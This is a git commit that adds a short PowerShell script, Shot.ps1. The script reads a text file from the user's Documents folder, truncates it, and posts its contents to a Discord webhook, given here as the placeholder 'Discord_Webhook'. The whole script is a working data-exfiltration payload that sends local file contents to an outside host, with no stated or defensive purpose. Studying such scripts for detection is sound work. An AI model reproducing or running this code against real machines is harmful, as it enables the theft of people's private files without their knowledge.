28fe8ca1f17298ea9adb06f125c7b1a11974f52d
dagnazty <38539274+dagnazty@users.noreply.github.com>
2023-08-18 21:53:07 -0400

    Add files via upload

---
+++ Shot.ps1
@@ -0,0 +1,27 @@
+﻿$webhook = "Discord_Webhook"
+$filePath = "$env:USERPROFILE\Documents\Testy.txt"
+
+# Read and truncate the file content if necessary
+try {
+    $fileContent = Get-Content $filePath -Raw
+    if ($fileContent.Length -gt 2000) {
+        $fileContent = $fileContent.Substring(0, 2000) + "..."
+    }
+
+    $body = @"
+{
+    "embeds": [
+        {
+            "title": "File Content",
+            "description": "$fileContent",
+            "color": 552583
+        }
+    ]
+}
+"@
+
+Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json"
+}
+catch {
+    Write-Host $_.Exception.Message
+}
